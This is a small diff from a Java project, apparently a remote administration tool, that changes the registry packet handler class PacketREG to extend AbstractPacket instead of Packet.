@@ -6,7 +6,7 @@ import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.FrameRemoteRegistry;
 
 
-public class PacketREG extends Packet {
+public class PacketREG extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
